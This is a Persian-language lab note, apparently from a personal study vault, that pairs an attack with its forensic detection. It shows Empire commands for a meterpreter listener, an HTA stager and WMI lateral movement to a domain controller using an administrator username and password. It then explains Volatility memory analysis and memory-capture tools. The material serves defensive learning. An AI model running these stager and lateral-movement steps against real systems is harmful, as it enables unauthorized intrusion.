

## 🙉 **Create Listener**

	// Empire commands used?
```
uselistener meterpreter
info
```

توی این مرحله داریم میگیم که میخواهیم یک لیسنر از نوع meterpreter درست کنیم که وقتی  Stager روی سیستم قربانی اجرا شد ما بتونیم یک C2 خوب داشته باشیم که بتونیم به واسطه این C2 بهتر فرایند post exploitation رو انجام بدیم 

```
//specify what stager to use
usestager windows/hta

//associate stager with the meterpreter listener
set Listener meterpreter

//write stager to the file
set OutFile stage.hta

//create the stager
execute
```

![[Pasted image 20251031183059.png]]


```
interact <agent-name>
usemodule powershell/lateral_movement/invoke_wmi
set Agent <agent-name>
set UserName offense\administrator
set Password 123456
set ComputerName dc-mantvydas
run
```

---

### 

Memory Dumps

```
volatility -f /mnt/memdumps/w7-empire.bin consoles --profile Win7SP1x64
```

![[Pasted image 20251031184445.png]]

###

logs kibana

![[Pasted image 20251031184509.png]]


# Volatility چیه؟ (به‌زبان ساده)

**Volatility** 
یک مجموعهٔ ابزار متن‌باز برای **تحلیل فورنزیک حافظه (memory forensics)** 
با گرفتن یک snapshot از RAM (memory dump) می‌تونی اطلاعاتی استخراج کنی که روی دیسک قابل‌دسترسی نیست یا پاک شده — مثل پروسس‌های در حال اجرا، DLLهای لودشده، سوکت‌های شبکه، محتویات پردازش‌ها، تاریخچهٔ کنسول‌ها، شواهد تزریق کد و خیلی چیزهای دیگه.

کاربردهای معمول:

- شناسایی پروسس‌های مخرب یا تزریق‌شده
    
- کشف ارتباط‌های شبکه‌ای (کانکشن‌ها، سوکت‌ها)
    
- جستجوی رشته‌ها/نشانه‌های payload در حافظه
    
- استخراج لاگ یا تاریخچهٔ اجرای دستورات (consoles, cmdline)
    
- dump گرفتن از پروسس‌ها برای آنالیز عمیق‌تر (memdump/procdump)
    
- اجرای yara/امضاها روی حافظه

# معنی هر بخش از آن دستور

- `volatility` → فراخوانی ابزار Volatility (معمولاً ورژن 2.x در این سینتکس)
    
- `-f /mnt/memdumps/w7-empire.bin` → مسیر فایل memory dump که می‌خوای تحلیل کنی
    
- `consoles` → نامِ پلاگینی که اجرا می‌شه؛ این پلاگین تاریخچه یا بافر کنسول‌ها (Console I/O) مثل خروجی‌های PowerShell/CMD رو استخراج می‌کنه — می‌تونه شامل دستورات اجراشده یا پاسخ‌هایی باشه که stager/meterpreter تولید کرده
    
- `--profile Win7SP1x64` → مشخص کردن پروفایل سیستم‌عاملِ تصویری؛ Volatility برای parse کردن ساختارهای حافظه باید بدونه این dump متعلق به چه ورژن/معماری ویندوزیه
    

> بدون پروفایل درست، Volatility ممکنه نتونه ساختارهای داخل حافظه را درست ترجمه کند و خروجی اشتباه یا خطا بده.


# چرا `consoles` برای beaconها مهمه؟

Agentها/stagerها (مثلاً Empire) اغلب با PowerShell یا یک شل تعاملی اجرا می‌شن. وقتی stager در حافظه اجرا می‌شه، بافرهای کنسول ممکنه حاوی:

- دستورات اجراشده (مثل `Invoke-Empire` یا دانلودهای Base64)
    
- پاسخ‌های HTTP یا URIهایی که agent برای beacon زدن استفاده کرده
    
- رشته‌هایی که حاوی URLهای listener، user-agent یا شناسه‌های session هستند
    

پس `consoles` می‌تونه این محتوای متنی را از حافظه بیرون بکشه و به‌عنوان شواهد نمایش بده.

---

# ابزارهای مرسوم و مثال‌های اجرایی

> توجه: نام ابزارها و پارامترها ممکن است در نسخه‌های جدید اندکی متفاوت باشد. من نمونه‌های معمول و پرکاربرد را می‌گویم؛ همیشه مستندات رسمی نسخهٔ مورد استفاده را هم چک کن.

### 1) Windows — AVML (Microsoft)  *(ساده، قابل‌اعتماد)*
- AVML ابزاری از مایکروسافت است برای گرفتن تصویر حافظه در فرمت قابل استفاده با Volatility/REKALL.
- مثال: (در مسیر اجرای AVML)
```powershell
.\avml.exe C:\Dumps\memory-avml.raw
```
- خروجی را هشی (مثلاً SHA256) کن:
```powershell
Get-FileHash C:\Dumps\memory-avml.raw -Algorithm SHA256
```

### 2) Windows — WinPmem (Rekall / Volatility community)
- winpmem.exe می‌تواند dump را به فرمت raw یا pmem بسازد.
- نمونه (فرمت raw):
```powershell
.\winpmem.exe --format raw --output C:\Dumps\memory.raw
```
- یا:
```powershell
.\winpmem.exe C:\Dumps\memory.raw
```

### 3) Windows — DumpIt / Belkasoft Live RAM Capturer / FTK Imager
- DumpIt یک ابزار portable (اجرای دو کلیک) است که یک فایل dump تولید می‌کند. FTK Imager (GUI) هم قابلیت گرفتن RAM را دارد.
- پس از اجرای GUI یا exe، مسیر خروجی را تعیین کن و تولید کن؛ سپس hash بگیر.

### 4) Linux — LiME (Linux Memory Extractor)
- LiME یک ماژول کرنل است که تصویر حافظه را به یک فایل روی دیسک یا روی شبکه می‌دهد.
- نمونهٔ بارگذاری ماژول (در دایرکتوری که lime.ko ساخته شده):
```bash
sudo insmod lime.ko "path=/root/memdump.lime format=lime"
# یا با خروجی raw
sudo insmod lime.ko "path=/root/memdump.raw format=raw"
```
- بعد از اتمام، فایل را به مکان امن منتقل و hash بگیر:
```bash
sha256sum /root/memdump.lime > /root/memdump.lime.sha256
```

### 5) macOS — OSXPmem / macOSpmem (ابزارهای متن‌باز)
- برای macOS ابزارهایی مثل **osxpmem** (مربوط به پروژهٔ Rekall/Volatility سابق) وجود دارد؛ معمولاً به شکل اسکریپت/باینری است.
- مثال کلی (بسته به نسخهٔ ابزار):
```bash
sudo python osxpmem.py -o /tmp/memdump.dmp
# یا اگر باینری است:
sudo ./osxpmem -o /tmp/memdump.dmp
```
(در macOS جدیدتر ممکن است نیاز به SIP/امنیت‌های اضافی داشته باشی؛ مستندات ابزار را بررسی کن.)

---

# بعد از گرفتن Dump — چه کارهایی انجام بدی
1. **محاسبهٔ hash** (SHA256) از فایل dump و ثبت آن.  
2. **کپی امن** فایل به سرور آنالیز ایزوله (حوزهٔ فورنزیک) — با انتقال امن (SCP/SFTP یا ذخیرهٔ آفلاین).  
3. **تحلیل با Volatility / Rekall / YARA**:
   - نمونهٔ بررسی اطلاعات اولیه با Volatility:
     ```bash
     volatility -f memory.raw imageinfo
     ```
   - سپس پلاگین‌های مفید: `pslist`, `pstree`, `malfind`, `netscan`, `consoles`, `cmdline`, `yarascan` و غیره.

4. **لاگ‌جمعی/همبستگی:** همزمان، لاگ‌های شبکه و endpoint را هم با زمان (timestamps) همبسته کن تا جریان حمله را بسازی.

---
